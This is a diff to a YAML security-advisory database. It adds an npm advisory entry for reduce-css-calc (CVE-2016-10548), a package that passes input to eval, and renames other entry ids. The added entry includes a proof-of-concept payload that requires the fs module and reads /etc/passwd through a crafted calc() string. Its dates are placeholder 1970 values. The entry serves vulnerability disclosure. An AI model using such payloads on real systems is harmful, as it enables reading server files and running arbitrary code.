@@ -1,5 +1,32 @@
 ---
-- id: ossindex:npm:reduce-css-calc:2017-07-29
+- id: npmjs:npm:reduce-css-calc:144
+  title: Arbitrary Code Injection
+  description: |
+    Affected versions of `reduce-css-calc` pass input directly to `eval`. If user input is passed into the calc function, this may result in cross-site scripting on the browser, or remote code execution on the server.
+
+    ## Proof of Concept
+
+    ```
+    const reduceCSSCalc = require('reduce-css-calc');
+    console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
+    console.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));
+    console.log(reduceCSSCalc(`calc(                       (fs['readFileSync']("/etc/passwd", "utf-8")))`));
+    ```
+  affected_package: reduce-css-calc
+  vulnerable_versions:
+  - "<=1.2.4"
+  severity: critical
+  package_manager: npm
+  cve:
+  - CVE-2016-10548
+  cwe: CWE-94
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Сковорода Никита Андреевич
+  references: https://npmjs.com/advisories/144
+  source_url: https://npmjs.com/advisories/144
+- id: ossindex:npm:reduce-css-calc:8405000451
   title: Arbitrary Code Injection
   description: "> Arbitrary code execution is possible through crafted css. This makes
     cross sites scripting (XSS) possible on the client and arbitrary code injection
@@ -18,7 +45,7 @@
   - https://gist.github.com/ChALkeR/415a41b561ebea9b341efbb40b802fc9
   - https://nodesecurity.io/advisories/144
   source_url: https://ossindex.net/resource/package/7014372605/vulnerabilities
-- id: snykio:npm:reduce-css-calc:CVE-2016-10548
+- id: snykio:npm:reduce-css-calc:20160913
   title: Arbitrary Code Injection
   description: |+
     `reduce-css-calc` is a package that reduces CSS calc() function to the
